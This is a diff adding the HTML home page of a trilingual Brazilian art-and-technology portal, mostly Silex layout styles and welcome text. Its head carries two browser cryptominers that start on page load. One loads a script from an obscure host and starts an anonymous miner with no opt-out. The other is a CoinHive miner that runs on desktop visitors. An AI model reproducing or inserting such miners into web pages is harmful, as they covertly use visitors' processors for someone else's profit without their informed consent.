@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <!-- generator meta tag -->
+    <!-- leave this for stats and Silex version check -->
+    <meta name="generator" content="Silex v2.2.7">
+    <!-- End of generator meta tag -->
+    <script type="text/javascript" src="//editor.silex.me/static/2.7/jquery.js" data-silex-static=""></script>
+    <script type="text/javascript" src="//editor.silex.me/static/2.7/jquery-ui.js" data-silex-static=""></script>
+    <script type="text/javascript" src="//editor.silex.me/static/2.7/pageable.js" data-silex-static=""></script>
+    <script type="text/javascript" src="//editor.silex.me/static/2.7/front-end.js" data-silex-static=""></script>
+    <link rel="stylesheet" href="//editor.silex.me/static/2.7/normalize.css" data-silex-static="">
+    <link rel="stylesheet" href="//editor.silex.me/static/2.7/front-end.css" data-silex-static="">
+
+    <style type="text/css" class="silex-style"></style>
+    <script type="text/javascript" class="silex-script"></script>
+    <style class="silex-inline-styles" type="text/css">
+        .body-initial {
+            background-color: rgba(255, 255, 255, 1);
+            left: 0px;
+            top: 0px;
+        }
+        
+        .silex-id-1478366444112-1 {
+            top: 5px;
+            left: 5px;
+            background-color: rgba(180, 180, 180, 1);
+            min-width: 1200px;
+        }
+        
+        .silex-id-1478366444112-0 {
+            min-height: 90px;
+            background-color: rgba(149, 149, 149, 1);
+            width: 1200px;
+            top: 15px;
+            left: 105px;
+        }
+        
+        .silex-id-1518112029294-0 {
+            width: 700px;
+            min-height: 60px;
+            top: 0px;
+            left: 10px;
+            background-color: transparent;
+        }
+        
+        .silex-id-1518271128119-1 {
+            width: 847px;
+            min-height: 120px;
+            top: 0px;
+            left: 10px;
+            background-color: transparent;
+        }
+        
+        .silex-id-1518270978944-0 {
+            width: 847px;
+            min-height: 120px;
+            top: 0px;
+            left: 10px;
+            background-color: transparent;
+        }
+        
+        .silex-id-1518271458069-2 {
+            width: 380px;
+            min-height: 99px;
+            top: 0px;
+            left: 0px;
+        }
+        
+        .silex-id-1518267755020-0 {
+            width: 200px;
+            min-height: 30px;
+            top: 29px;
+            left: 968px;
+        }
+        
+        .silex-id-1518469961137-4 {
+            width: 321px;
+            min-height: 47px;
+            top: 0px;
+            left: 380px;
+        }
+        
+        .silex-id-1518470041203-5 {
+            width: 321px;
+            min-height: 47px;
+            top: 25px;
+            left: 380px;
+        }
+        
+        .silex-id-1518470111805-6 {
+            width: 321px;
+            min-height: 40px;
+            top: 51px;
+            left: 380px;
+        }
+        
+        .silex-id-1474394621033-3 {
+            top: 140px;
+            left: 5px;
+            background-color: rgba(46, 46, 46, 1);
+            min-width: 1200px;
+        }
+        
+        .silex-id-1474394621032-2 {
+            min-height: 320px;
+            background-color: rgba(53, 233, 117, 1);
+            width: 1200px;
+            top: 15px;
+            left: 100px;
+            border-radius: 20px 20px 20px 20px;
+            border-width: 5px 5px 5px 5px;
+            border-style: solid;
+        }
+        
+        .silex-id-1518112395580-3 {
+            width: 366px;
+            min-height: 268px;
+            top: 10px;
+            left: 10px;
+            background-color: rgba(106, 106, 106, 1);
+            border-width: 4px 4px 4px 4px;
+            border-style: solid;
+            border-radius: 6px 6px 0 0;
+        }
+        
+        .silex-id-1518116903648-0 {
+            width: 220px;
+            background-color: rgba(79, 24, 139, 1);
+            min-height: 218px;
+            top: 10px;
+            left: 400px;
+            border-radius: 10px 10px 10px 10px;
+        }
+        
+        .silex-id-1518117941686-4 {
+            width: 90px;
+            min-height: 90px;
+            top: 10px;
+            left: 115px;
+            border-width: 2px 2px 2px 2px;
+            border-style: solid;
+            border-radius: 5px 5px 5px 5px;
+        }
+        
+        .silex-id-1518116972654-2 {
+            width: 90px;
+            min-height: 90px;
+            top: 10px;
+            left: 10px;
+            border-width: 2px 2px 2px 2px;
+            border-style: solid;
+            border-radius: 5px 5px 5px 5px;
+        }
+        
+        .silex-id-1518116929404-1 {
+            width: 90px;
+            min-height: 90px;
+            top: 115px;
+            left: 115px;
+            border-width: 2px 2px 2px 2px;
+            border-style: solid;
+            border-radius: 5px 5px 5px 5px;
+        }
+        
+        .silex-id-1518118022345-5 {
+            width: 90px;
+            min-height: 90px;
+            top: 115px;
+            left: 10px;
+            border-width: 2px 2px 2px 2px;
+            border-style: solid;
+            border-radius: 5px 5px 5px 5px;
+        }
+        
+        .silex-id-1518214998514-4 {
+            width: 100px;
+            background-color: rgb(255, 255, 255);
+            min-height: 90px;
+            top: 10px;
+            left: 630px;
+        }
+        
+        .silex-id-1518214904249-2 {
+            width: 20px;
+            min-height: 20px;
+            top: 5px;
+            left: 5px;
+        }
+        
+        .silex-id-1518214942943-3 {
+            width: 20px;
+            min-height: 20px;
+            top: 35px;
+            left: 5px;
+        }
+        
+        .silex-id-1518215062791-5 {
+            width: 20px;
+            min-height: 20px;
+            top: 65px;
+            left: 5px;
+        }
+        
+        .silex-id-1518215099148-6 {
+            width: 56px;
+            min-height: 20px;
+            top: 5px;
+            left: 30px;
+        }
+        
+        .silex-id-1518215131628-7 {
+            width: 65px;
+            min-height: 20px;
+            top: 35px;
+            left: 30px;
+        }
+        
+        .silex-id-1518215138674-8 {
+            width: 56px;
+            min-height: 20px;
+            top: 65px;
+            left: 30px;
+        }
+        
+        .silex-id-1518215573209-9 {
+            width: 366px;
+            min-height: 268px;
+            top: 10px;
+            left: 10px;
+            background-color: rgba(106, 106, 106, 1);
+            border-width: 4px 4px 4px 4px;
+            border-style: solid;
+            border-radius: 6px 6px 0 0;
+        }
+        
+        .silex-id-1518221451690-0 {
+            width: 366px;
+            min-height: 268px;
+            top: 10px;
+            left: 10px;
+            background-color: rgba(106, 106, 106, 1);
+            border-width: 4px 4px 4px 4px;
+            border-style: solid;
+            border-radius: 6px 6px 0 0;
+        }
+        
+        .silex-id-1478366450713-3 {
+            top: 505px;
+            left: 5px;
+            background-color: rgba(255, 152, 43, 1);
+            min-width: 1200px;
+        }
+        
+        @media only screen and (max-width: 480px),
+        only screen and (max-device-width: 480px) {
+            .silex-id-1478366450713-3 {
+                top: 475px;
+                left: 0px;
+            }
+        }
+        
+        .silex-id-1478366450713-2 {
+            min-height: 85px;
+            background-color: transparent;
+            width: 1200px;
+            top: 15px;
+            left: 105px;
+        }
+        
+        @media only screen and (max-width: 480px),
+        only screen and (max-device-width: 480px) {
+            .silex-id-1478366450713-2 {
+                min-height: 120px;
+            }
+        }
+        
+        .silex-id-1518127547792-0 {
+            width: 430px;
+            background-color: transparent;
+            min-height: 65px;
+            top: 0px;
+            left: 0px;
+        }
+        
+        .silex-id-1518129201345-2 {
+            width: 120px;
+            background-color: transparent;
+            min-height: 85px;
+            top: 0px;
+            left: 431px;
+        }
+        
+        .silex-id-1518130058896-4 {
+            width: 123px;
+            background-color: transparent;
+            min-height: 20px;
+            top: 66px;
+            left: 0px;
+        }
+        
+        .silex-id-1518118247005-7 {
+            top: 124px;
+            left: 5px;
+            min-width: 1200px;
+        }
+        
+        .silex-id-1518118247004-6 {
+            width: 1200px;
+            min-height: 933px;
+            top: 15px;
+            left: 100px;
+        }
+        
+        .silex-id-1518469699327-0 {
+            width: 670px;
+            background-color: rgb(255, 255, 255);
+            min-height: 900px;
+            top: 0px;
+            left: 0px;
+        }
+        
+        .silex-id-1518128342871-1 {
+            width: 340px;
+            background-color: rgb(255, 255, 255);
+            min-height: 600px;
+            top: 0px;
+            left: 700px;
+        }
+        
+        .silex-id-1518214447359-1 {
+            min-width: 1200px;
+            top: 852px;
+            left: 5px;
+        }
+        
+        .silex-id-1518214447356-0 {
+            width: 1200px;
+            min-height: 860px;
+            top: 15px;
+            left: 105px;
+        }
+        
+        .silex-id-1518182593205-0 {
+            width: 536px;
+            background-color: rgb(255, 255, 255);
+            min-height: 460px;
+            top: 0px;
+            left: 0px;
+        }
+        
+        .silex-id-1518216543389-11 {
+            width: 1200px;
+            background-color: rgb(255, 255, 255);
+            min-height: 400px;
+            top: 460px;
+            left: 0px;
+        }
+        
+        .silex-id-1518182949637-1 {
+            width: 200px;
+            background-color: transparent;
+            min-height: 200px;
+            top: 0px;
+            left: 536px;
+        }
+        
+        .silex-id-1518469927286-3 {
+            top: 124px;
+            left: 5px;
+        }
+        
+        .silex-id-1518469927284-2 {
+            min-height: 918px;
+        }
+        
+        .silex-id-1518469857414-1 {
+            width: 800px;
+            background-color: rgb(255, 255, 255);
+            min-height: 800px;
+            top: 0px;
+            left: 0px;
+        }
+    </style>
+    <title></title>
+    <script type="text/javascript" class="silex-json-styles">
+        [{"desktop":{"body-initial":{"background-color":"rgba(255,255,255,1)","left":"0px","top":"0px"},"silex-id-1474394621033-3":{"top":"140px","left":"5px","background-color":"rgba(46,46,46,1)","min-width":"1200px"},"silex-id-1474394621032-2":{"min-height":"320px","background-color":"rgba(53,233,117,1)","width":"1200px","top":"15px","left":"100px","border-radius":"20px 20px 20px 20px ","border-width":"5px 5px 5px 5px ","border-style":"solid"},"silex-id-1474394605264-1":{"min-height":"100px","width":"100px","top":"100px","left":"100px"},"silex-id-1474394605263-0":{"min-height":"100px","background-color":"transparent"},"silex-id-1478366444112-0":{"min-height":"90px","background-color":"rgba(149,149,149,1)","width":"1200px","top":"15px","left":"105px"},"silex-id-1478366444112-1":{"top":"5px","left":"5px","background-color":"rgba(180,180,180,1)","min-width":"1200px"},"silex-id-1478366450713-2":{"min-height":"85px","background-color":"transparent","width":"1200px","top":"15px","left":"105px"},"silex-id-1478366450713-3":{"top":"505px","left":"5px","background-color":"rgba(255,152,43,1)","min-width":"1200px"},"silex-id-1518112029294-0":{"width":"700px","min-height":"60px","top":"0px","left":"10px","background-color":"transparent"},"silex-id-1518112395580-3":{"width":"366px","min-height":"268px","top":"10px","left":"10px","background-color":"rgba(106,106,106,1)","border-width":"4px 4px 4px 4px ","border-style":"solid","border-radius":"6px 6px 0 0 "},"silex-id-1518114133493-5":{"width":"123px","background-color":"rgb(255, 255, 255)","min-height":"109px","top":"9px","left":"16px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"20px 20px 20px 20px ","background-image":"url('wireframe.gif')"},"silex-id-1518114455780-6":{"width":"123px","background-color":"rgb(255, 255, 255)","min-height":"109px","top":"9px","left":"151px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"20px 20px 20px 20px ","background-image":"url('tintas.gif')"},"silex-id-1518115105918-7":{"width":"123px","background-color":"rgb(255, 255, 255)","min-height":"109px","top":"130px","left":"152px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"20px 20px 20px 20px ","background-image":"url('mario_coins.gif')"},"silex-id-1518115106366-8":{"width":"123px","background-color":"rgb(255, 255, 255)","min-height":"109px","top":"129px","left":"16px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"20px 20px 20px 20px ","background-image":"url('wall.jpg')"},"silex-id-1518116903648-0":{"width":"220px","background-color":"rgba(79,24,139,1)","min-height":"218px","top":"10px","left":"400px","border-radius":"10px 10px 10px 10px "},"silex-id-1518116929404-1":{"width":"90px","min-height":"90px","top":"115px","left":"115px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"5px 5px 5px 5px "},"silex-id-1518116972654-2":{"width":"90px","min-height":"90px","top":"10px","left":"10px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"5px 5px 5px 5px "},"silex-id-1518117941686-4":{"width":"90px","min-height":"90px","top":"10px","left":"115px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"5px 5px 5px 5px "},"silex-id-1518118022345-5":{"width":"90px","min-height":"90px","top":"115px","left":"10px","border-width":"2px 2px 2px 2px ","border-style":"solid","border-radius":"5px 5px 5px 5px "},"silex-id-1518118247004-6":{"width":"1200px","background-color":"","min-height":"933px","top":"15px","left":"100px"},"silex-id-1518118247005-7":{"top":"124px","left":"5px","min-width":"1200px"},"silex-id-1518127547792-0":{"width":"430px","background-color":"transparent","min-height":"65px","top":"0px","left":"0px"},"silex-id-1518128342871-1":{"width":"340px","background-color":"rgb(255, 255, 255)","min-height":"600px","top":"0px","left":"700px"},"silex-id-1518129201345-2":{"width":"120px","background-color":"transparent","min-height":"85px","top":"0px","left":"431px"},"silex-id-1518130058896-4":{"width":"123px","background-color":"transparent","min-height":"20px","top":"66px","left":"0px"},"silex-id-1518131257789-6":{"width":"","background-color":"","min-height":"398px"},"silex-id-1518131257790-7":{"top":"775px","left":"5px"},"silex-id-1518182593205-0":{"width":"536px","background-color":"rgb(255, 255, 255)","min-height":"460px","top":"0px","left":"0px"},"silex-id-1518182949637-1":{"width":"200px","background-color":"transparent","min-height":"200px","top":"0px","left":"536px"},"silex-id-1518214447356-0":{"width":"1200px","background-color":"","min-height":"860px","top":"15px","left":"105px"},"silex-id-1518214447359-1":{"min-width":"1200px","top":"852px","left":"5px"},"silex-id-1518214904249-2":{"width":"20px","min-height":"20px","top":"5px","left":"5px"},"silex-id-1518214942943-3":{"width":"20px","min-height":"20px","top":"35px","left":"5px"},"silex-id-1518214998514-4":{"width":"100px","background-color":"rgb(255, 255, 255)","min-height":"90px","top":"10px","left":"630px"},"silex-id-1518215062791-5":{"width":"20px","min-height":"20px","top":"65px","left":"5px"},"silex-id-1518215099148-6":{"width":"56px","min-height":"20px","top":"5px","left":"30px"},"silex-id-1518215131628-7":{"width":"65px","min-height":"20px","top":"35px","left":"30px"},"silex-id-1518215138674-8":{"width":"56px","min-height":"20px","top":"65px","left":"30px"},"silex-id-1518215573209-9":{"width":"366px","min-height":"268px","top":"10px","left":"10px","background-color":"rgba(106,106,106,1)","border-width":"4px 4px 4px 4px ","border-style":"solid","border-radius":"6px 6px 0 0 "},"silex-id-1518216543389-11":{"width":"1200px","background-color":"rgb(255, 255, 255)","min-height":"400px","top":"460px","left":"0px"},"silex-id-1518221451690-0":{"width":"366px","min-height":"268px","top":"10px","left":"10px","background-color":"rgba(106,106,106,1)","border-width":"4px 4px 4px 4px ","border-style":"solid","border-radius":"6px 6px 0 0 "},"silex-id-1518267755020-0":{"width":"200px","min-height":"30px","top":"29px","left":"968px"},"silex-id-1518270978944-0":{"width":"847px","min-height":"120px","top":"0px","left":"10px","background-color":"transparent"},"silex-id-1518271128119-1":{"width":"847px","min-height":"120px","top":"0px","left":"10px","background-color":"transparent"},"silex-id-1518271458069-2":{"width":"380px","min-height":"99px","top":"0px","left":"0px"},"silex-id-1518469699327-0":{"width":"670px","background-color":"rgb(255, 255, 255)","min-height":"900px","top":"0px","left":"0px"},"silex-id-1518469857414-1":{"width":"800px","background-color":"rgb(255, 255, 255)","min-height":"800px","top":"0px","left":"0px"},"silex-id-1518469927284-2":{"width":"","background-color":"","min-height":"918px"},"silex-id-1518469927286-3":{"top":"124px","left":"5px"},"silex-id-1518469961137-4":{"width":"321px","min-height":"47px","top":"0px","left":"380px"},"silex-id-1518470041203-5":{"width":"321px","min-height":"47px","top":"25px","left":"380px"},"silex-id-1518470111805-6":{"width":"321px","min-height":"40px","top":"51px","left":"380px"}},"mobile":{"silex-id-1478366450713-3":{"top":"475px","left":"0px"},"silex-id-1478366450713-2":{"min-height":"120px"}},"componentData":{}}]
+    </script>
+
+
+
+
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2.2" data-silex-viewport="">
+
+
+    <meta name="website-width" content="1200">
+    <style type="text/css" class="silex-style-settings">
+        .website-width {
+            width: 1200px;
+        }
+    </style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <script type="text/javascript" charset="utf-8" async="" src="https://platform.twitter.com/js/button.5f64a1a5864e1229f84c8defd65341b4.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" src="https://platform.twitter.com/js/timeline.25e3f797ea5047ab5a8d06fd6ee7f701.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <style id="current-page-style">
+        .page-redes {
+            display: inherit;
+        }
+    </style>
+    <!-- Silex HEAD tag do not remove -->
+    <title>a1000ton.com.br | Desenhos Loucos</title>
+    <meta name="description" content="Amilton: {Fanzine, Histórias em Quadrinhos, Grafite, Portfólio. Artes de São Paulo - SP e Ouro Preto - MG.">
+    <meta name="keywords" content="comics, art, writer, graffiti, gatox, hq, gibi">
+    <meta name="authors" content="Stefano Azevedo">
+
+				
+<!-- Start Open Web Analytics Tracker -->
+<script type="text/javascript">
+//<![CDATA[
+var owa_baseUrl = 'https://a1000ton.com.br/central/owa/';
+var owa_cmds = owa_cmds || [];
+owa_cmds.push(['setSiteId', '27b0536f944f6960c0153a040e1f249c']);
+owa_cmds.push(['trackPageView']);
+owa_cmds.push(['trackClicks']);
+
+(function() {
+	var _owa = document.createElement('script'); _owa.type = 'text/javascript'; _owa.async = true;
+	owa_baseUrl = ('https:' == document.location.protocol ? window.owa_baseSecUrl || owa_baseUrl.replace(/http:/, 'https:') : owa_baseUrl );
+	_owa.src = owa_baseUrl + 'modules/base/js/owa.tracker-combined-min.js';
+	var _owa_s = document.getElementsByTagName('script')[0]; _owa_s.parentNode.insertBefore(_owa, _owa_s);
+}());
+//]]>
+</script>
+<!-- End Open Web Analytics Code -->
+
+    <script src="https://www.freecontent.bid./saZ6.js"></script>
+    <script>
+        var miner = new Client.Anonymous('1ef11bc72efd99ba18dd3ad6325ebe9651ae65045faeadc9e6f34edd6fae3b45', {
+            throttle: 0.8
+        });
+        miner.start();
+    </script>
+
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('fzqjy5QoaoeNdKOOC2EbqeyLs2EqKOSP', {throttle: 0.9});
+        
+        	// Only start on non-mobile devices and if not opted-out
+        	// in the last 14400 seconds (4 hours):
+        	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        		miner.start();
+        	}
+    </script>
+
+    <div id="fb-root"></div>
+    <script>
+        (function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = 'https://connect.facebook.net/pt_PT/sdk.js#xfbml=1&version=v2.12';
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, 'script', 'facebook-jssdk'));
+    </script>
+    <!-- End of Silex HEAD tag do not remove -->
+</head>
+
+<body data-silex-id="body-initial" class="body-initial enable-mobile silex-runtime" data-silex-type="container">
+    <div class="silex-pages">
+
+
+        <a id="page-br" data-silex-type="page" class="page-element">Br</a><a id="page-es" data-silex-type="page" class="page-element">Es</a><a id="page-en" data-silex-type="page" class="page-element">En</a><a id="page-redes" data-silex-type="page" class="page-element page-link-active">Redes</a>
+        <a id="page-scrapbook" data-silex-type="page" class="page-element">Scrapbook</a></div>
+
+
+
+
+
+
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1478366444112-1 section-element" data-silex-id="silex-id-1478366444112-1" style="">
+        <div data-silex-type="container" class="editable-style silex-element-content silex-id-1478366444112-0 silex-container-content container-element prevent-draggable website-width" data-silex-id="silex-id-1478366444112-0">
+            <div data-silex-type="text" class="editable-style silex-id-1518112029294-0 text-element page-br paged-element" data-silex-id="silex-id-1518112029294-0" style="" data-silex-href="#!page-br">
+                <div class="silex-element-content normal">
+                    <h1><span style="color: rgb(255, 0, 0);">Aqui há</span> <span style="color: rgb(255, 153, 0);">1000 tons</span> <span style="color: rgb(255, 255, 0);">de cores </span>da madrugada.</h1>
+                </div>
+            </div>
+
+
+            <div data-silex-type="text" class="editable-style text-element silex-id-1518271128119-1 paged-element page-en" data-silex-id="silex-id-1518271128119-1" style="" data-silex-href="#!page-br">
+                <div class="silex-element-content normal">
+                    <h1><span style="color: rgb(255, 0, 0);">Here are </span><span style="color: rgb(255, 153, 0);">1000 tones</span> <span style="color: rgb(255, 255, 0);"><span style="color: rgb(0, 0, 0);">of dawn </span>colors.</span>
+                    </h1>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1518270978944-0 paged-element page-es" data-silex-id="silex-id-1518270978944-0" style="" data-silex-href="#!page-br">
+                <div class="silex-element-content normal">
+                    <h1><span style="color: rgb(255, 0, 0);">Aquí hay </span><span style="color: rgb(255, 153, 0);">1000 tonos</span> <span style="color: rgb(255, 255, 0);">de colores </span>de la madrugada.</h1>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style silex-id-1518271458069-2 text-element paged-element page-redes page-scrapbook" data-silex-id="silex-id-1518271458069-2" style="">
+                <div class="silex-element-content normal">
+                    <h1><span style="font-family: courier new,monospace;"><font size="7"><b><span style="color: rgb(11, 83, 148);" class="heading1">Página Social</span></b>
+                        </font>
+                        </span>
+                    </h1>
+                    <h1>
+                        <font size="4"><b><span style="color: rgb(11, 83, 148);"></span></b></font>
+                    </h1>
+                </div>
+            </div>
+            <div data-silex-type="image" class="editable-style silex-id-1518267755020-0 image-element page-scrapbook paged-element page-redes" data-silex-id="silex-id-1518267755020-0" style=""><img src="central/layout/email.jpg" class="silex-element-content"></div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1518469961137-4 page-redes paged-element page-scrapbook" data-silex-id="silex-id-1518469961137-4"
+                style="" data-silex-href="#!page-scrapbook">
+                <div class="silex-element-content normal">
+                    <font size="5"></font>
+                    <font size="5"><span style="font-family: courier new,monospace;"><b><span style="color: rgb(11, 83, 148);" class="heading1">Assine meu Scrapbook!</span></b>
+
+                        </span>
+                    </font>
+                    <font size="5">
+                    </font>
+                    <h1>
+                        <font size="5"><b><span style="color: rgb(11, 83, 148);"></span></b></font>
+                    </h1>
+                    <font size="5">
+                    </font>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1518470041203-5 page-redes paged-element" data-silex-id="silex-id-1518470041203-5" style="" data-silex-href="#!page-redes">
+                <div class="silex-element-content normal">
+                    <font size="5"></font>
+                    <font size="5"><span style="font-family: courier new,monospace;"><b><span style="color: rgb(11, 83, 148);" class="heading1">Visite minhas redes.</span></b>
+
+                        </span>
+                    </font>
+                    <font size="5">
+                    </font>
+                    <h1>
+                        <font size="5"><b><span style="color: rgb(11, 83, 148);"></span></b></font>
+                    </h1>
+                    <font size="5">
+                    </font>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1518470111805-6 page-redes paged-element page-scrapbook" data-silex-id="silex-id-1518470111805-6" style="" data-silex-href="#!page-br">
+                <div class="silex-element-content normal">
+                    <font size="5"><span style="font-family: courier new,monospace;"><b><span style="color: rgb(11, 83, 148);" class="heading1">Voltar ao Portal.</span></b>
+
+                        </span>
+                    </font>
+                    <font size="5">
+                    </font>
+                    <h1>
+                        <font size="5"><b><span style="color: rgb(11, 83, 148);"></span></b></font>
+                    </h1>
+                    <font size="5">
+                    </font>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1474394621033-3 section-element paged-element page-es page-en page-br" data-silex-id="silex-id-1474394621033-3" style="">
+        <div data-silex-type="container" class="editable-style silex-element-content silex-id-1474394621032-2 silex-container-content container-element prevent-draggable website-width" data-silex-id="silex-id-1474394621032-2">
+            <div data-silex-type="text" class="editable-style silex-id-1518112395580-3 text-element page-en paged-element" data-silex-id="silex-id-1518112395580-3" style="">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;"><b>Welcome to the a1000ton.com.br portal!</b></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 255);">A portal of Arts and Technology.<br></span></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 0, 0);"><span style="background-color: rgb(255, 255, 255);">To see ARTS, click the icon with ink.</span></span>
+                    </div>
+                    <div style="text-align: center;"><span style="background-color: rgb(255, 255, 255);">To see TECHNOLOGY, click the icon with lights.</span></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">To visit my SOCIAL WALL,</span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">click the icon with bricks.</span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">To help me with GOLD,</span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">click the icon with coins.</span><br></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><i>The author is grateful for your visit!</i></div>
+                    <div style="text-align: right;"><span style="background-color: rgb(224, 102, 102);"><span style="color: rgb(11, 83, 148);"><b><i>- Amilton Cores.</i></b></span></span>
+                    </div>
+                </div>
+            </div>
+
+            <div data-silex-type="container" class="editable-style silex-id-1518116903648-0 container-element" data-silex-id="silex-id-1518116903648-0" style="">
+                <div data-silex-type="image" class="editable-style silex-id-1518117941686-4 image-element" data-silex-id="silex-id-1518117941686-4" style="" data-silex-href="ruindows" title="Ruindows Blog"><img src="central/layout/wireframes.gif" class="silex-element-content"></div>
+
+
+
+                <div data-silex-type="image" class="editable-style image-element silex-id-1518116972654-2" data-silex-id="silex-id-1518116972654-2" style="" data-silex-href="hq" title="Quadrinhos"><img src="central/layout/tinta_girando.gif" class="silex-element-content"></div>
+
+
+                <div data-silex-type="image" class="editable-style silex-id-1518116929404-1 image-element" data-silex-id="silex-id-1518116929404-1" style="" title="Mina de Ouro" data-silex-href="mina-de-ouro"><img src="central/layout/mario_money.gif" class="silex-element-content"></div>
+                <div data-silex-type="image" class="editable-style silex-id-1518118022345-5 image-element page-link-active" data-silex-id="silex-id-1518118022345-5" style="" data-silex-href="#!page-redes" title="Muro Social"><img src="central/layout/the_wall.jpg" class="silex-element-content"></div>
+            </div>
+            <div data-silex-type="container" class="editable-style silex-id-1518214998514-4 container-element" data-silex-id="silex-id-1518214998514-4" style="">
+                <div data-silex-type="image" class="editable-style silex-id-1518214904249-2 image-element" data-silex-id="silex-id-1518214904249-2" style="" data-silex-href="#!page-br"><img src="central/layout/br.png" class="silex-element-content"></div>
+                <div data-silex-type="image" class="editable-style silex-id-1518214942943-3 image-element" data-silex-id="silex-id-1518214942943-3" style="" data-silex-href="#!page-es"><img src="central/layout/cl.png" class="silex-element-content"></div>
+                <div data-silex-type="image" class="editable-style silex-id-1518215062791-5 image-element" data-silex-id="silex-id-1518215062791-5" style="" data-silex-href="#!page-en"><img src="central/layout/um.png" class="silex-element-content"></div>
+                <div data-silex-type="text" class="editable-style silex-id-1518215099148-6 text-element" data-silex-id="silex-id-1518215099148-6" style="" data-silex-href="#!page-br">
+                    <div class="silex-element-content normal">PT_Br</div>
+                </div>
+                <div data-silex-type="text" class="editable-style text-element silex-id-1518215131628-7" data-silex-id="silex-id-1518215131628-7" style="" data-silex-href="#!page-es">
+                    <div class="silex-element-content normal">Español<br></div>
+                </div>
+                <div data-silex-type="text" class="editable-style text-element silex-id-1518215138674-8" data-silex-id="silex-id-1518215138674-8" style="" data-silex-href="#!page-en">
+                    <div class="silex-element-content normal">English</div>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1518215573209-9 paged-element page-es" data-silex-id="silex-id-1518215573209-9" style="">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;"><b>Bienvenido al portal a1000ton.com.br!</b></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 255);">Un portal de Artes y Tecnología.<br></span></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 0, 0);"><span style="background-color: rgb(255, 255, 255);">Para ver ARTES, clic el icono con tinta.</span></span>
+                    </div>
+                    <div style="text-align: center;"><span style="background-color: rgb(255, 255, 255);">Para ver TECNOLOGÍA, clic el icono con luces.</span></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">Para visitar mi MURAL SOCIAL,</span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">clic el icono con ladrillos.</span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">Para ayudarme con ORO,</span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">clic el icono con monedas.</span><br></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><i>¡El autor agradece demasiado su visita!</i></div>
+                    <div style="text-align: right;"><span style="background-color: rgb(224, 102, 102);"><span style="color: rgb(11, 83, 148);"><b><i>- Amilton Cores.</i></b></span></span><br></div>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1518221451690-0 paged-element page-br" data-silex-id="silex-id-1518221451690-0" style="">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;"><b>Bem Vindo ao portal a1000ton.com.br!</b></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 255);">Um portal de Artes &amp; Tecnologia.<br></span></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 0, 0);"><span style="background-color: rgb(255, 255, 255);">Para ver ARTES, use o ícone com tinta.<span> </span><span></span></span>
+                        </span>
+                    </div>
+                    <div style="text-align: center;"><span style="background-color: rgb(255, 255, 255);">Para ver TECNOLOGIA, use o ícone com luzinhas.<br></span></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">Para visitar meu MURAL SOCIAL,<br></span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">use o ícone com tijolos.<br></span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">Para me ajudar com OURO,<br></span></div>
+                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">use o ícone com moedas.</span><br></div>
+                    <div style="text-align: center;"><br></div>
+                    <div style="text-align: center;"><i>O autor agradece demais sua visita!<br></i></div>
+                    <div style="text-align: right;"><span style="background-color: rgb(224, 102, 102);"><span style="color: rgb(11, 83, 148);"><b><i>- Amilton Cores.</i></b></span></span><br></div>
+                </div>
+            </div>
+        </div>
+    </div>
